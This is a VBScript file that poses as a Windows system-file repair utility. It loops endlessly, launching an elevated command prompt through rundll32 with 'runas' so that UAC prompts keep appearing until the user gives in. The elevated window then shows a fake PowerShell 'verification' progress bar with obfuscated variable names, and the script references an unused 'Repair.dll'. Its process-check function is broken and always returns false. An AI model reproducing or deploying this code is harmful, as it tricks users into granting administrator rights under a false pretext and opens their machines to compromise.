Option Explicit

Dim fso, shell, scriptDir, dllPath, uniqueTitle, cmdCommand, oShell

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("Shell.Application")
Set oShell = CreateObject("WScript.Shell")

scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
dllPath = fso.BuildPath(scriptDir, "Repair.dll")

uniqueTitle = "Repair: C:\Windows\System32\sfc.exe"
cmdCommand = " & @echo off & taskkill /f /im wscript.exe & cls & echo Do not close this Command Prompt window until the verification is 100% complete & powershell -Command ""for ($Hkz14kQYO=0; $Hkz14kQYO -le 100; $Hkz14kQYO++) { Write-Host ""`rProgress: $Hkz14kQYO%"" -NoNewline; for ($bfOTHaoTX=0; $bfOTHaoTX -lt 10; $bfOTHaoTX++) { if ([Console]::KeyAvailable) { $GRR9Gw = [Console]::ReadKey($true); if ($GRR9Gw.KeyChar -eq 'p') { Write-Host ''; exit } }; Start-Sleep -Milliseconds 100 } }; Write-Host ''"" & title " & uniqueTitle & ""

Do
    If Not IsSpecificCMDRunning(uniqueTitle) Then
        
        On Error Resume Next
        shell.ShellExecute "rundll32.exe", "shell32.dll,ShellExec_RunDLL cmd.exe /k title " & uniqueTitle & "" & cmdCommand & "", _
		"", "runas", 2
		
		
        On Error GoTo 0
        
        Dim waitTime
        waitTime = 0
        Do While waitTime < 10000 
            If IsSpecificCMDRunning(uniqueTitle) Then
                WScript.Quit
            End If
            WScript.Sleep 100
            waitTime = waitTime + 100
        Loop
        
        
    Else
        Do While IsSpecificCMDRunning(uniqueTitle)
            WScript.Sleep 1000
        Loop
    End If
Loop

Set shell = Nothing
Set fso = Nothing
Set oShell = Nothing

Function IsSpecificCMDRunning(title)
    Dim oExec, output
    On Error Resume Next
    
    On Error GoTo 0
    
    If InStr(1, output, "cmd.exe", 1) > 0 Then
        IsSpecificCMDRunning = True
    Else
        IsSpecificCMDRunning = False
    End If
End Function